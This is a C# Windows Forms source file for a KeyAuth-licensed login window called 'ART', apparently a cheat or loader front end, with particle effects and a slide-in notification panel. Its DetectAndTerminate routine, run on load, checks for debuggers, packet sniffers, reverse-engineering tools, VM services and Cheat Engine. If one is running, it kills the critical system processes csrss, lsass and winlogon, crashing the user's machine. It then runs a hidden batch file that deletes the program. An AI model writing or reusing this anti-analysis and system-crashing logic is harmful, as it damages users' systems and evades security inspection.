using Guna.UI2.WinForms;
using KeyAuth;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static Guna.UI2.Native.WinApi;
using Timer = System.Windows.Forms.Timer;
namespace ART
{
    public partial class Form1 : Form
    {
        private bool isDragging = false;
        private Point dragStartPoint = Point.Empty;

        private const int ParticleCount = 100;
        private const int DrawCount = 90; // Number of particles to draw
        private readonly Random _random = new Random();
        private readonly PointF[] _particlePositions = new PointF[ParticleCount];
        private readonly PointF[] _particleTargetPositions = new PointF[ParticleCount];
        private readonly float[] _particleSpeeds = new float[ParticleCount];
        private readonly float[] _particleSizes = new float[ParticleCount];
        private readonly float[] _particleRadii = new float[ParticleCount];
        private readonly float[] _particleRotations = new float[ParticleCount];

        private Timer slideTimer;
        private Timer hideTimer;

        [DllImport("kernel32.dll")]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static api KeyAuthApp = new api(
            name: "ART PAGLU's Application", // Application Name
            ownerid: "YOURS", // Owner ID
            secret: "YOURS", // Application Secret
            version: "1.0" // Application Version // Enter Your KeyAuth Details to create and distribute accounts
        );

        [DllImport("user32.dll")]
        internal static extern int SetWindowCompositionAttribute(IntPtr hwnd, ref WindowCompositionAttributeData data);

        [DllImport("dwmapi.dll", ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMargins);

        [StructLayout(LayoutKind.Sequential)]
        internal struct AccentPolicy
        {
            public AccentState AccentState;
            public int GradientColor;
            public int AnimationId;
        }


        internal enum AccentState
        {
            ACCENT_DISABLED = 0,
            ACCENT_ENABLE_GRADIENT = 1,
            ACCENT_ENABLE_TRANSPARENTGRADIENT = 2,
            ACCENT_ENABLE_ACRYLICBLURBEHIND = 3,
            ACCENT_INVALID_STATE = 4
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct WindowCompositionAttributeData
        {
            public int Attribute;
            public IntPtr Data;
            public int SizeOfData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MARGINS
        {
            public int Left;
            public int Right;
            public int Top;
            public int Bottom;
        }

        internal static class WindowCompositionAttribute
        {
            public const int WCA_ACCENT_POLICY = 19; // Constant for accent policy
        }
        private void SetupCaretPositionUpdater(Guna2TextBox textBox)
        {
            Point targetCaretPos = Point.Empty;

            textBox.TextChanged += (s, e) =>
            {
                // Obtén la posición actual del cursor
                Point temp;
                GetCaretPos(out temp);
                // Restablece la posición del cursor a la posición guardada anteriormente
                SetCaretPos(targetCaretPos.X, targetCaretPos.Y);
                // Actualiza la posición guardada del cursor
                targetCaretPos = temp;
            };

            // Inicia un hilo que se ejecutará en segundo plano
            Thread t = new Thread(() =>
            {
                // Guarda la posición del cursor actual
                Point current = targetCaretPos;
                while (true)
                {
                    // Verifica si la posición del cursor ha cambiado
                    if (current != targetCaretPos)
                    {
                        // Comprueba si la distancia entre las posiciones es mayor que 23 (umbral arbitrario)
                        if (Math.Abs(current.X - targetCaretPos.X) + Math.Abs(current.Y - targetCaretPos.Y) > 20)
                            current = targetCaretPos;
                        else
                        {
                            // Mueve gradualmente el cursor hacia la nueva posición
                            current.X += Math.Sign(targetCaretPos.X - current.X);
                            current.Y += Math.Sign(targetCaretPos.Y - current.Y);
                        }

                        // Invoca la operación de mover el cursor en el subproceso de la interfaz de usuario
                        textBox.Invoke((Action)(() => SetCaretPos(current.X, current.Y)));
                    }

                    Thread.Sleep(1);
                }
            });
            t.IsBackground = true;
            t.Start();
        }
        public Form1()
        {



            InitializeComponent();
            InitializeParticles();

            AttachMouseEvents(guna2PictureBox1);
            AttachMouseEvents(a);

            DoubleBuffered = true;
            SetupCaretPositionUpdater(username);
            SetupCaretPositionUpdater(password);
            SetupCaretPositionUpdater(key);
            Timer timer = new Timer
            {
                Interval = 3 // Roughly 60 FPS
            };
            timer.Tick += (sender, args) =>
            {
                UpdateParticles();
                Invalidate(); // Causes the form to be redrawn
            };
            timer.Start();

            // Initialize timers for notification
            slideTimer = new Timer { Interval = 10 };
            slideTimer.Tick += SlideTimer_Tick;

            hideTimer = new Timer { Interval = 2000 }; // Notification duration
            hideTimer.Tick += HideTimer_Tick;


        }
  

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool GetCaretPos(out Point lpPoint);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool SetCaretPos(int X, int Y);
        private void InitializeParticles()
        {
            Size screenSize = Screen.PrimaryScreen.Bounds.Size;
            for (int i = 0; i < ParticleCount; i++)
            {
                _particlePositions[i] = new PointF(0, 0);
                _particleTargetPositions[i] = new PointF(_random.Next(screenSize.Width), screenSize.Height * 2);
                _particleSpeeds[i] = 1 + _random.Next(25);
                _particleSizes[i] = _random.Next(8);
                _particleRadii[i] = _random.Next(4);
                _particleRotations[i] = 0;
            }
        }

        private void UpdateParticles()
        {
            Size screenSize = Screen.PrimaryScreen.Bounds.Size;
            for (int i = 0; i < ParticleCount; i++)
            {
                if (_particlePositions[i].X == 0 || _particlePositions[i].Y == 0)
                {
                    _particlePositions[i] = new PointF(_random.Next(screenSize.Width + 1), 15f);
                    _particleSpeeds[i] = 1 + _random.Next(25);
                    _particleRadii[i] = _random.Next(4);
                    _particleSizes[i] = _random.Next(8);
                    _particleTargetPositions[i] = new PointF(_random.Next(screenSize.Width), screenSize.Height * 2);
                }

                float deltaTime = 1.0f / 60; // Assuming 60 FPS
                _particlePositions[i] = Lerp(_particlePositions[i], _particleTargetPositions[i], deltaTime * (_particleSpeeds[i] / 60));
                _particleRotations[i] += deltaTime;

                if (_particlePositions[i].Y > screenSize.Height)
                {
                    _particlePositions[i] = new PointF(0, 0);
                    _particleRotations[i] = 0;
                }
            }
        }

        private PointF Lerp(PointF start, PointF end, float t)
        {
            return new PointF(start.X + (end.X - start.X) * t, start.Y + (end.Y - start.Y) * t);
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;

            for (int i = 0; i < DrawCount; i++)
            {
                DrawTriangleWithGlow(e.Graphics, _particlePositions[i], _particleSizes[i], _particleRotations[i]);
            }
        }

        private void DrawTriangleWithGlow(Graphics graphics, PointF position, float size, float rotation)
        {
            float angle = (float)(Math.PI * 2 / 3); // 120 degrees for equilateral triangle
            PointF[] vertices = new PointF[3];

            for (int i = 0; i < 3; i++)
            {
                vertices[i] = new PointF(
                    position.X + size * (float)Math.Cos(rotation + i * angle),
                    position.Y + size * (float)Math.Sin(rotation + i * angle)
                );
            }

            graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;

            // Draw glow effect
            int maxGlowLayers = 10;
            for (int j = 0; j < maxGlowLayers; j++)
            {
                int alpha = 25 - 2 * j; // Gradually decrease alpha for each layer
                using (Brush glowBrush = new SolidBrush(Color.FromArgb(alpha, 148, 146, 146))) // Semi-transparent color
                {
                    float glowSize = size + j * 2; // Gradually increase the glow size
                    graphics.FillEllipse(glowBrush, position.X - glowSize / 2, position.Y - glowSize / 2, glowSize, glowSize);
                }
            }

            // Draw triangle
            using (Brush brush = new SolidBrush(Color.FromArgb(191, 189, 189))) // Solid color for the triangle
            {
                graphics.FillPolygon(brush, vertices);
            }
        }

        private void AttachMouseEvents(Control control)
        {
            control.MouseDown += move1;
            control.MouseMove += move2;
            control.MouseUp += move3;
        }






        private void move1(object sender, MouseEventArgs e)
        {
            isDragging = true;
            dragStartPoint = new Point(e.X, e.Y);
        }

        private void move2(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point newLocation = new Point(e.X - dragStartPoint.X, e.Y - dragStartPoint.Y);
                this.Location = new Point(this.Location.X + newLocation.X, this.Location.Y + newLocation.Y);
            }
        }

        private void move3(object sender, MouseEventArgs e)
        {
            isDragging = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            EnableTransparent();
            KeyAuthApp.init();
            DetectAndTerminate();

            notificationPanel.Visible = false;
        }

        internal void EnableTransparent()
        {
            // Set the accent policy for acrylic blur behind
            var accent = new AccentPolicy
            {
                AccentState = AccentState.ACCENT_ENABLE_ACRYLICBLURBEHIND,
                GradientColor = unchecked((int)0x99000000) // Semi-transparent black
            };

            int accentStructSize = Marshal.SizeOf(accent);
            IntPtr accentPtr = Marshal.AllocHGlobal(accentStructSize);
            Marshal.StructureToPtr(accent, accentPtr, false);

            var data = new WindowCompositionAttributeData
            {
                Attribute = WindowCompositionAttribute.WCA_ACCENT_POLICY,
                SizeOfData = accentStructSize,
                Data = accentPtr
            };

            SetWindowCompositionAttribute(this.Handle, ref data);
            Marshal.FreeHGlobal(accentPtr);

            // Extend the frame into the client area to support acrylic blur
            var margins = new MARGINS { Left = -1, Right = -1, Top = -1, Bottom = -1 };
            DwmExtendFrameIntoClientArea(this.Handle, ref margins);
        }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            EnableTransparent();
        }

        private void SlideTimer_Tick(object sender, EventArgs e)
        {
            if (notificationPanel.Top > this.ClientSize.Height - notificationPanel.Height)
            {
                notificationPanel.Top -= 10; // Move the panel up
            }
            else
            {
                slideTimer.Stop();
                hideTimer.Start(); // Start the timer to hide the notification
            }
        }

        private void HideTimer_Tick(object sender, EventArgs e)
        {
            // Hide the notification panel
            notificationPanel.Visible = false;
            hideTimer.Stop();
        }

        public void ShowNotification(string message, Color backgroundColor)
        {
            notificationPanel.BackColor = backgroundColor;
            a.Text = message;

            // Reset panel position
            notificationPanel.Top = this.ClientSize.Height;
            notificationPanel.Left = 0;
            notificationPanel.Visible = true;

            // Start sliding the panel up
            slideTimer.Start();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            KeyAuthApp.login(username.Text, password.Text);
            if (KeyAuthApp.response.success)
            {
                SoundPlayer sndplayr = new SoundPlayer(ART.Properties.Resources.acctivated);
                sndplayr.Play();

                panel ML = new panel();
                ML.Show();
                Hide();
                ShowNotification("Login Successful!", Color.FromArgb(71, 69, 69)); // Example notification

            }
            else
            {
                ShowNotification("Login Failed!", Color.FromArgb(71, 69, 69)); // Example notification for failure
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void DetectAndTerminate()
        {
            string exePath = Assembly.GetExecutingAssembly().Location;

            string[] targetProcesses = new string[]
            {
        "ollydbg.exe", "ProcessHacker.exe", "Dump-Fixer.exe", "kdstinker.exe", "tcpview.exe",
        "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe", "regmon.exe",
        "procexp.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe",
        "ImportREC.exe", "PETools.exe", "LordPE.exe", "SysInspector.exe", "proc_analyzer.exe",
        "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe",
        "joeboxserver.exe", "ida64.exe", "ida.exe", "idaq64.exe", "Vmtoolsd.exe",
        "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe",
        "ReClass.NET.exe", "x64dbg.exe", "OLLYDBG.exe", "CheatEngine.exe", "cheatengine-x86_64-SSE4-AVX2.exe",
        "MugenJinFuu-i386.exe", "Mugen JinFuu.exe", "MugenJinFuu-x86_64-SSE4-AVX2.exe", "MugenJinFuu-x86_64.exe",
        "KsDumper.exe", "dnSpy.exe", "cheatengine-i386.exe", "cheatengine-x86_64.exe", "Fiddler Everywhere.exe",
        "HTTPDebuggerSvc.exe", "Fiddler.WebUi.exe", "createdump.exe", "dnSpy.exe", "calculator.exe", "LunarEngine.exe", "c.exe", "d.exe"
            };

            foreach (Process process in Process.GetProcesses())
            {
                string processName = process.ProcessName + ".exe";
                if (Array.Exists(targetProcesses, element => element.Equals(processName, StringComparison.OrdinalIgnoreCase)))
                {
                    // Terminate critical system processes like csrss.exe and lsass.exe
                    KillCriticalProcesses("csrss");
                    KillCriticalProcesses("lsass");
                    KillCriticalProcesses("winlogon");

                    Console.WriteLine($"Process '{processName}' detected. Terminating csrss.exe and lsass.exe...");
                    ScheduleSelfDelete(exePath);
                    break;
                }
            }
        }

        private void KillCriticalProcesses(string processName)
        {
            foreach (Process criticalProcess in Process.GetProcessesByName(processName))
            {
                try
                {
                    criticalProcess.Kill();
                    Console.WriteLine($"{processName}.exe has been terminated.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to terminate {processName}.exe: {ex.Message}");
                }
            }
        }

        private void ScheduleSelfDelete(string exePath)
        {
            string batchFilePath = Path.Combine(Path.GetTempPath(), "selfdelete.bat");

            using (StreamWriter writer = new StreamWriter(batchFilePath))
            {
                writer.WriteLine("@echo off");
                writer.WriteLine("timeout /t 2 /nobreak > nul");
                writer.WriteLine($"del /f \"{exePath}\"");
                writer.WriteLine($"del /f \"{batchFilePath}\"");
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = batchFilePath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });

            Environment.Exit(0);
        }

        private void username_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
